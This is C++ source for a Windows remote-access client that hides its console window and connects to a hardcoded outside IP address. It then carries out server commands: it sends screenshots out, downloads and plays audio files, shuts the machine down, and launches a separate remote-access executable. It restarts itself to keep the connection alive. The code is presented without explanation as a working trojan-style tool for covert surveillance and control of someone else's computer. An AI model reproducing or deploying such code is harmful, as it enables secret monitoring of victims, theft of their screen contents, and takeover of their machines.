#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include "api.h"
#include <winsock2.h>
#include <string>
#include <random>
#include <initializer_list>

#pragma comment(lib , "API.lib")
#pragma comment(lib , "Ws2_32.lib")
#pragma warning(disable:4996)

#define PORT 9999
#define SERVER_IP "94.198.218.23"
#define SMALL_BUFFLEN 4096
#define RESTART_PROGRAM -13

wchar_t AudioFormatW[20];
char AudioFormatA[20];
char tmpBuffA[6];
wchar_t tmpBuffW[6];
wchar_t PathToAudio[MAX_PATH];


void GetWC(wchar_t* dest , const char* c)
{
	const size_t cSize = strlen(c) + 1;
	mbstowcs(dest, c, cSize);

}

void GetFormatAudioFile(const char* command) {
	//format of file
	ZeroMemory(AudioFormatA, sizeof(AudioFormatA));
	int start = 6;
	while (command[start] != '\r') {
		AudioFormatA[start - 6] = command[start];
		start++;
	}
	GetWC(AudioFormatW , AudioFormatA);
}

BOOL StartsWith(char* buffer, const char* string) {
	if (strlen(string) > strlen(buffer)) return FALSE;
	int i = 0;
	while (string[i]) {
		if (string[i] != buffer[i]) return FALSE;
		i++;
	}
	return TRUE;
}

void RestartThisProgram() {
	wchar_t PathToThisProcess[MAX_PATH];
	ZeroMemory(PathToThisProcess, sizeof(PathToThisProcess));
	GetModuleFileNameW(NULL, PathToThisProcess, MAX_PATH);
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	PROCESS_INFORMATION pi;
	CreateProcess(PathToThisProcess, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE,
		NULL, NULL, &si, &pi);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	ExitProcess(RESTART_PROGRAM);
}

void GenerateRandomName() {
	std::random_device rd;
	std::mt19937 gen(rd());
	for (int i = 0; i < 5; ++i) {
		int num = gen() % 23;
		num = num + 97;
		tmpBuffA[i] = num;
	}
	tmpBuffA[5] = '\0';
	GetWC(tmpBuffW, tmpBuffA);
}

enum CurrState {
	NON_CONNECTION_ESTABLISHED_SEND,
	NON_CONNECTION_ESTABLISHED_RECV,
	WAITING_FOR_INCOMING_COMMAND,
	RESULT_OF_COMMAND_SEND,
	SENDING_SCREENSHOT_IN_PROGRESS,
	RECVING_MP3_IN_PROGRESS,
	SHUTDOWN , 
	REMOTESHELL , 
	EXIT
};

int SmallRecv(SOCKET sock, char* buff, int nLenght) {
	ZeroMemory(buff, nLenght);
	int CommonBytes = nLenght;
	char CurrBuff[SMALL_BUFFLEN];
	int start = 0;
	while (CommonBytes != 0) {
		ZeroMemory(CurrBuff, SMALL_BUFFLEN);
		int nCurrRecv = recv(sock, CurrBuff, CommonBytes, 0);
		CommonBytes -= nCurrRecv;

		if (nCurrRecv == 0) RestartThisProgram();
		for (int i = start; i < start + nCurrRecv; ++i) {
			buff[i] = CurrBuff[i - start];
		}
		start = start + nCurrRecv;
	}
	return nLenght;
}


int main() {
	FreeConsole();
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	SOCKET ClientSoc = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
	sockaddr_in ServerAddr;
	ServerAddr.sin_family = AF_INET;
	ServerAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
	ServerAddr.sin_port = htons(PORT);

	if (WSAConnect(ClientSoc, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
		LoadMessage("Connection to Server failed...");
		closesocket(ClientSoc);
		WSACleanup();
		RestartThisProgram();
	}


	CurrState cState = NON_CONNECTION_ESTABLISHED_SEND;

	while (TRUE) {

		switch (cState) {
		case NON_CONNECTION_ESTABLISHED_SEND:
		{
			char buffSend[SMALL_BUFFLEN];
			ZeroMemory(buffSend, sizeof(buffSend));
			strcpy(buffSend, "Client Hallo");
			send(ClientSoc, buffSend, SMALL_BUFFLEN, 0);
			cState = NON_CONNECTION_ESTABLISHED_RECV;
			break;
		}
		case NON_CONNECTION_ESTABLISHED_RECV:
		{
			char buffRecv[SMALL_BUFFLEN];
			ZeroMemory(&buffRecv, sizeof(buffRecv));
			SmallRecv(ClientSoc, buffRecv, SMALL_BUFFLEN);

			if (strcmp(buffRecv, "Server Hallo") != 0) {
				LoadMessage("Connection not established. Non tipicalServer answer");
			}
			cState = WAITING_FOR_INCOMING_COMMAND;
			break;
		}
		case WAITING_FOR_INCOMING_COMMAND:
		{
			char buffRecv[SMALL_BUFFLEN];
			ZeroMemory(&buffRecv, sizeof(buffRecv));
  			SmallRecv(ClientSoc, buffRecv, SMALL_BUFFLEN);

			if (strcmp(buffRecv, "SHUTDOWN") == 0) {
				cState = SHUTDOWN;
				break;
			}

			if (strcmp(buffRecv, "SCREENSHOT") == 0) {
				cState = SENDING_SCREENSHOT_IN_PROGRESS;
				break;
			}

			if (strcmp(buffRecv, "EXIT") == 0) {
				cState = EXIT;
				break;
			}
			if (StartsWith(buffRecv, "PLAY\r\n")) {
				cState = RECVING_MP3_IN_PROGRESS;
				GetFormatAudioFile(buffRecv);
				break;
			}
			if (strcmp(buffRecv, "REMOTESHELL") == 0) {
				cState = REMOTESHELL;
				break;
			}
			std::string ErrorMessage= std::string("Incorrect Command Server. BuffRecv : ") + std::string(buffRecv);
			LoadMessage(ErrorMessage.c_str());
			break;

		}
		case EXIT: {
			closesocket(ClientSoc);
			RestartThisProgram();
		}
		case REMOTESHELL: {
			wchar_t PathToProgramFiles[MAX_PATH];
			SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, 0, PathToProgramFiles);
			std::wstring ExecPath = std::wstring(PathToProgramFiles) + L"\\RemoteController\\RemoteAccess.exe";
			STARTUPINFO si;
			ZeroMemory(&si, sizeof(si));
			si.cb = sizeof(si);
			PROCESS_INFORMATION pi;
			if (!CreateProcess(ExecPath.c_str(), NULL, NULL, NULL, FALSE,
				0, NULL, NULL, &si, &pi)) {
				std::cout << "Can not exec RemoteAccess.exe. Error code : " << GetLastError() << std::endl;
				LoadMessage("Can not exec RemoteAccess.exe");
			};
			cState = WAITING_FOR_INCOMING_COMMAND;
			break;
		}
		case SHUTDOWN:
		{
			cState = WAITING_FOR_INCOMING_COMMAND;
			ShutDownThisSystem();
			break;
		}
		case SENDING_SCREENSHOT_IN_PROGRESS:
		{
			wchar_t PathToLocalAppData[MAX_PATH];
			SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, PathToLocalAppData);
			std::wstring CheckFile = std::wstring(PathToLocalAppData) + L"\\abracadabra.txt";
			HANDLE tmphFile = CreateFileW(CheckFile.c_str(),
				GENERIC_READ | GENERIC_WRITE,
				FILE_SHARE_READ,
				NULL,
				CREATE_NEW,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
			CloseHandle(tmphFile);

			std::wstring PathToScreenshot = std::wstring(PathToLocalAppData) + L"\\1.png";
			DWORD dwAttributes;
			Sleep(600);
			while (TRUE) {
				dwAttributes = GetFileAttributes(PathToScreenshot.c_str());
				if (dwAttributes != INVALID_FILE_ATTRIBUTES) break;
			}

			HANDLE hFile = CreateFile(PathToScreenshot.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hFile == INVALID_HANDLE_VALUE) {
				LoadMessage("Can not open screenshot file");
				break;
			}


			DWORD dwRead = -1;
			char buffSend[SMALL_BUFFLEN];
			while (dwRead) {
				ZeroMemory(buffSend, SMALL_BUFFLEN);
				dwRead = 0;
				ReadFile(hFile, buffSend, SMALL_BUFFLEN, &dwRead, NULL);
				send(ClientSoc, buffSend, SMALL_BUFFLEN, 0);
			}

			char EndMessage[SMALL_BUFFLEN];
			ZeroMemory(EndMessage, sizeof(EndMessage));
			strcpy(EndMessage, "ENDOFFILE");
			send(ClientSoc, EndMessage, SMALL_BUFFLEN, 0);

			CloseHandle(hFile);
			DeleteFile(PathToScreenshot.c_str());
			cState = WAITING_FOR_INCOMING_COMMAND;
			break;
		}
		case RECVING_MP3_IN_PROGRESS:
		{
			GenerateRandomName();
			char buffer[SMALL_BUFFLEN];
			wchar_t PathToLocalAppDataFolder[MAX_PATH];
			if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, PathToLocalAppDataFolder))) {
				LoadMessage("Error in ShGetFolderPathW");
				break;
			}
			std::wstring PathToAudioFile = std::wstring(PathToLocalAppDataFolder) +
				L"\\" + std::wstring(tmpBuffW) + std::wstring(AudioFormatW);

			std::fstream out(PathToAudioFile, std::ios::out | std::ios::binary);

			ZeroMemory(PathToAudio, MAX_PATH);
			for (int i = 0; i < PathToAudioFile.size(); ++i) {
				PathToAudio[i] = PathToAudioFile[i];
			}

			while (TRUE) {
				ZeroMemory(buffer, SMALL_BUFFLEN);  
				int iResult = SmallRecv(ClientSoc, buffer, SMALL_BUFFLEN);

				if (StartsWith(buffer, "ENDOFF")) break;
				out.write(buffer, iResult);
			}
			out.close();
			HANDLE hThread = CreateThread(NULL, 0, PlaySomeSound, (LPVOID)PathToAudio, 0, NULL);
			cState = WAITING_FOR_INCOMING_COMMAND;
			break;
		}
		}
	}
}